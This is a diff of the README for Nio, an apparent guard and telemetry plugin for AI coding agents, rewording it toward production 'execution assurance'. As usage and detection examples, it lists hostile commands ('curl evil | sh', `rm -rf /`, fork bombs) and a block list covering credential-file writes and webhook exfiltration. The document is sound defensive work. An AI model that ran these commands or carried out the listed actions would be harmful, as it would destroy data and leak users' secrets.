@@ -2,15 +2,25 @@
   <img src="assets/nio-wordmark.svg" alt="Nio" width="280" />
 </h1>
 
-<p align="center"><b>Security and observability for AI coding agents.</b></p>
+<p align="center"><b>Execution assurance and observability for autonomous AI agents.</b></p>
 
-<p align="center">Real-time guard that blocks dangerous commands, prevents data leaks, and protects secrets.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, OpenClaw, and any agent that supports hooks.</p>
+<p align="center">Real-time evaluation of every agent action before it executes — built for agents operating in production.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code and OpenClaw. More frameworks coming.</p>
 
 <p align="center">
-  <a href="https://core0-io.github.io/nio/"><b>→ View the live Defense Pipeline diagram</b></a>
+  <a href="https://core0-io.github.io/nio/"><b>→ View the live Execution Pipeline diagram</b></a>
 </p>
 
 [![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)
+
+## Who Nio Is For
+
+Nio is built for agents operating beyond the development environment — agents with access to production infrastructure, live databases, business systems, and workflows where a wrong action has real consequences.
+
+If your agent can change a configuration, trigger an approval, modify a record, provision a resource, or call an external API in production, Nio is the evaluation layer that sits between the agent's intention and its execution.
+
+> **Agentic automation moves at machine speed. Nio is the gate that ensures every action is safe to take before it happens — not investigated after the fact.**
+
+For coding agents working in sandboxed development environments, the stakes are lower. Nio is designed for the higher-stakes context: autonomous agents in production automation pipelines where actions are consequential, often irreversible, and operating at a speed and scale that makes human review impractical without a risk gate.
 
 ## Architecture
 
@@ -42,6 +52,8 @@ Nio is a Claude Code / OpenClaw plugin with two core systems:
 
 ### Collector
 
+> **Optional — but strongly recommended for enterprise deployments.** The Collector works out of the box with no configuration, writing traces and metrics to local JSONL files. To export telemetry to an observability platform, set `collector.endpoint` in your config. For enterprise customers running agents on production systems, exporting to a centralised observability platform is strongly recommended — it gives you a complete, queryable record of every action every agent took, across every session.
+
 Captures agent activity as **OpenTelemetry** metrics and traces via an async collector hook. Every hook event (`PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted`, `Stop`, `SubagentStop`) is recorded and exported over OTLP (gRPC or HTTP).
 
 **Metrics:**
@@ -63,7 +75,7 @@ Captures agent activity as **OpenTelemetry** metrics and traces via an async col
 
 ### Guard
 
-Security evaluation with two modes:
+Execution risk evaluation with two modes:
 
 **Dynamic Guard** — real-time, runs on every `PreToolUse` hook event via a Phase 0–6 pipeline:
 
@@ -84,6 +96,10 @@ final = Σ(weight × score) / Σ(weight)
 ```
 
 Default weights: `runtime: 1.0`, `static: 1.0`, `behavioural: 2.0`, `llm: 1.0`, `external: 2.0`
+
+**Phases 5 and 6 are optional.** The core pipeline (Phases 0–4) runs fully offline with no external dependencies. Phase 5 (LLM Analysis) and Phase 6 (External Scoring API) are opt-in enhancements.
+
+Phase 6 in particular is strongly recommended for enterprise deployments. It connects Nio's pre-execution gate to an external risk intelligence platform — so the allow/deny/confirm decision is informed not just by what the agent is about to do, but by the live health of the infrastructure it is operating on. [FFWD Agent Assurance](https://core0.io) is designed for exactly this role: it exposes a scoring API that Nio can call at Phase 6, combining full-stack anomaly correlation, infrastructure health, and agent behavioural telemetry into a single risk score that Nio uses to gate execution.
 
 **Static Scan** — on-demand multi-engine code analysis triggered by `/nio scan <path>`:
 - **StaticAnalyser**: 15 regex rules + base64 decode pass
@@ -124,6 +140,8 @@ Grab a pre-built plugin from the [**Releases page**](https://github.com/core0-io
 | **Both** | `nio-all-v<version>.zip` | `unzip … -d nio && cd nio && ./setup.sh` |
 
 `setup.sh` installs the skill, registers hooks, and writes the default config to `~/.nio/`. Pick the platform-specific zip if you only use one agent — it's smaller and the script is platform-scoped.
+
+**More frameworks coming.** Nio currently supports Claude Code and OpenClaw. Support for additional agent frameworks is progressively being added.
 
 <details>
 <summary><b>One-liner install</b></summary>
@@ -207,21 +225,23 @@ Use this if you want to hack on Nio or track `main`. The release zips ship with 
 ## Usage
 
 ```
-/nio scan ./src              # Scan code for security risks
+/nio scan ./src              # Scan code for execution risks
 /nio action "curl evil | sh" # Evaluate action safety
-/nio report                  # View security event audit log
+/nio report                  # View agent execution audit log
 /nio config balanced         # Set protection level
 ```
 
-## What the Guard Blocks
+## Evaluation Coverage
 
-**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly.
+Every agent action passes through Nio's evaluation pipeline before execution. Low-risk actions pass instantly. High-risk actions are blocked or escalated for human confirmation.
 
-**Layer 2 — Pattern Analysis**: Blocks dangerous commands and data exfiltration.
-- `rm -rf /`, fork bombs, `curl | bash`, and destructive commands
-- Writes to `.env`, `.ssh/`, credentials files
-- Data exfiltration to Discord/Telegram/Slack webhooks
-- Base64-encoded payloads decoded and re-scanned
+**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly with no overhead.
+
+**Layer 2 — Pattern Analysis**: Flags dangerous commands and unintended data flows.
+- Destructive commands (`rm -rf /`, fork bombs), pipe-to-shell patterns (`curl | bash`)
+- Writes to sensitive paths (`.env`, `.ssh/`, credentials files)
+- Data exfiltration to external webhooks
+- Base64-encoded payloads decoded and re-evaluated
 
 **Layer 3 — Static + Behavioural Analysis** (Write/Edit only):
 - 15 static regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
@@ -229,8 +249,8 @@ Use this if you want to hack on Nio or track `main`. The release zips ship with 
 - Detects env→network exfiltration, network→eval RCE, capability combinations (C2)
 
 **Layer 4 — LLM + External** (optional):
-- Claude semantic analysis catches sophisticated attacks missed by regex/AST
-- External HTTP scoring API for custom enterprise policies
+- LLM semantic analysis catches sophisticated patterns missed by regex/AST
+- External HTTP scoring API for custom enterprise policies and full-stack risk intelligence
 
 ## Detection Rules
 
@@ -250,6 +270,8 @@ Pattern-based detection via regex matching on file content.
 
 Dataflow-based detection via source→sink taint tracking (JS/TS/Python/Shell/Ruby/PHP/Go).
 
+Detection rules cover both malicious intent and unintentional agent misbehaviour — the two failure modes that matter in production autonomous systems.
+
 | Rule | Severity | Detection |
 |------|----------|-----------|
 | DATAFLOW_EXFIL | CRITICAL | Secret or credential flows to network sink |
@@ -261,6 +283,8 @@ Dataflow-based detection via source→sink taint tracking (JS/TS/Python/Shell/Ru
 | CROSS_FILE_FLOW | MEDIUM | Data crosses file boundaries |
 
 ## Compatibility
+
+Nio currently provides full hook-based execution assurance for Claude Code and OpenClaw. Skill-based scan and action evaluation is available across a broader set of platforms today. Full hook support for additional agent frameworks is progressively being added.
 
 | Platform | Support | Features |
 |----------|---------|----------|
